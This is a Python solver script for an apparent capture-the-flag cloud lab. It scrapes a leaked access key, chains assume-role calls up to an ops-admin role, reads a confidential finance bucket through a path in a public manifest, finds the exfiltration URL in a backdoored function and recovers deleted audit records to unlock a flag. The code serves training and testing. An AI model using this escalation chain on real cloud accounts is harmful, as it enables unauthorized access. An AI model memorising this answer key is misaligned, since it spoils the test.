"""Intended-path solver: walk the IAM graph, follow every stage, recompute the audit chain."""

import hashlib
import re

import httpx
from openrange.content.solver import SolveResult, TaskResult, find_flags

TASK_ID = "cloud-board-master"
IAM = {"Host": "iam.cloudcompany.internal"}
S3 = {"Host": "s3.cloudcompany.internal"}
FN = {"Host": "functions.cloudcompany.internal"}
AUDIT = {"Host": "audit.cloudcompany.internal"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = None
    frags: dict[str, str | None] = {
        "iam": None,
        "bucket": None,
        "functions": None,
        "audit": None,
        "verdict": None,
    }

    users = httpx.get(base + "/iam/users", headers=IAM, timeout=10).json()
    policies = httpx.get(base + "/iam/policies", headers=IAM, timeout=10).json()
    _ = [user for user in users.get("users", []) if user.get("kind") == "role"]
    landing = httpx.get(base + "/", timeout=10).text
    m_key = re.search(r"\b(AKICC-[A-Z0-9-]+)\b", landing)
    bootstrap_key = m_key.group(1) if m_key else ""
    if not bootstrap_key and detail is None:
        detail = "could not resolve the developer onboarding key from the landing page"
        bootstrap_key = ""

    token = ""
    if bootstrap_key:
        chain_targets = ["ci-runner", "deploy-bot", "ops-admin"]
        headers = IAM | {"X-CC-Key": bootstrap_key}
        for target in chain_targets:
            reply = httpx.post(
                base + "/iam/sts/assume", headers=headers, json={"role": target}, timeout=10
            )
            if reply.status_code != 200 and detail is None:
                detail = f"assume-role to {target} refused: {reply.json()}"
                break
            token = str(reply.json().get("token", ""))
            headers = IAM | {"X-CC-Token": token}

    ops = {"X-CC-Token": token}
    _ = policies  # policies are readable recon; the console summary drives the fragment

    console = httpx.get(base + "/iam/console", headers=IAM | ops, timeout=10)
    m_frag = re.search(r"fragment\[iam\]=([A-Z2-7]{4})", console.text)
    if m_frag:
        frags["iam"] = m_frag.group(1)
    elif detail is None:
        detail = f"iam console unreadable with issued token: {console.text[:200]}"

    listing = httpx.get(base + "/s3/cc-public-assets", headers=S3, timeout=10).json()
    manifest_name = next((o for o in listing.get("objects", []) if "manifest" in str(o)), None)
    ledger_path = ""
    if manifest_name:
        manifest = httpx.get(
            base + f"/s3/cc-public-assets/{manifest_name}", headers=S3, timeout=10
        ).text
        m_obj = re.search(r"s3://cc-finance-archive/(\S+)", manifest)
        ledger_path = m_obj.group(1) if m_obj else ""
    if ledger_path:
        ledger = httpx.get(
            base + f"/s3/cc-finance-archive/{ledger_path}", headers=S3 | ops, timeout=10
        ).text
        m_frag = re.search(r"fragment\[bucket\]=([A-Z2-7]{4})", ledger)
        if m_frag:
            frags["bucket"] = m_frag.group(1)
        elif detail is None:
            detail = f"ledger object lacked bucket fragment: {ledger[:200]}"
    elif detail is None:
        detail = "confidential object path absent from public manifest"

    revisions = httpx.get(
        base + "/functions/image-resizer/revisions", headers=FN | ops, timeout=10
    ).json()
    suspect_rev = None
    for rev in revisions.get("revisions", []):
        if rev.get("author") == "maintenance-ci":
            suspect_rev = rev.get("revision")
            break
    if suspect_rev is not None:
        code = httpx.get(
            base + f"/functions/image-resizer/revision/{suspect_rev}/code",
            headers=FN | ops,
            timeout=10,
        ).text
        exfil_url = str(re.search(r"post\('(\S+?)'", code).group(1)) if "post('" in code else ""
        verdict = httpx.post(
            base + "/functions/image-resizer/backdoor-verdict",
            headers=FN | ops,
            json={"revision": suspect_rev},
            timeout=10,
        ).json()
        if verdict.get("confirmed") and verdict.get("fragment"):
            frags["functions"] = str(verdict["fragment"])
        elif detail is None:
            detail = f"backdoor verdict refused revision {suspect_rev}: {verdict}"

    entries = httpx.get(base + "/audit/entries", headers=AUDIT | ops, timeout=10).json()["entries"]
    prev = "genesis"
    gap_seq = None
    for entry in entries:
        expected_prev = prev
        if entry["prev_hash"] != expected_prev:
            gap_seq = entry["seq"]
            break
        prev = hashlib.sha256(
            (entry["prev_hash"] + "|" + entry["actor"] + "|" + entry["action"]).encode()
        ).hexdigest()

    quarantine = httpx.get(base + "/audit/quarantine", headers=AUDIT | ops, timeout=10).json()
    deleted_records = quarantine.get("quarantined", [])
    actor = str(deleted_records[0].get("deleted_by")) if deleted_records else ""
    destination = ""
    for record in deleted_records:
        m_url = re.search(r"(https://\S+)", str(record.get("action", "")))
        if m_url:
            destination = m_url.group(1)
            break
    if gap_seq is None and detail is None:
        detail = "no hash-chain gap detected in audit entries"

    del_verdict = httpx.post(
        base + "/audit/deletion-verdict",
        headers=AUDIT | ops,
        json={"actor": actor, "deleted": len(deleted_records)},
        timeout=10,
    ).json()
    if del_verdict.get("correct") and del_verdict.get("fragment"):
        frags["audit"] = str(del_verdict["fragment"])
    elif detail is None:
        detail = f"deletion verdict refused: {del_verdict}"

    ex_verdict = httpx.post(
        base + "/audit/exfil-verdict",
        headers=AUDIT | ops,
        json={"destination": destination or exfil_url},
        timeout=10,
    ).json()
    if ex_verdict.get("correct") and ex_verdict.get("fragment"):
        frags["verdict"] = str(ex_verdict["fragment"])
    elif detail is None:
        detail = f"exfil verdict refused for {destination or exfil_url}: {ex_verdict}"

    captured = None
    missing = sorted(k for k, v in frags.items() if not v)
    if not missing:
        reply = httpx.post(base + "/board", json={"fragments": frags}, timeout=10).json()
        flags = find_flags(reply.get("flag") or "")
        if reply.get("status") == "unlocked" and flags:
            captured = flags[0]
        elif detail is None:
            detail = f"board refused complete set: {reply}"
    elif detail is None:
        detail = f"fragments missing for stages {missing}"

    return SolveResult(
        results=[
            TaskResult(task_id=TASK_ID, ok=captured is not None, captured=captured, detail=detail)
        ]
    )
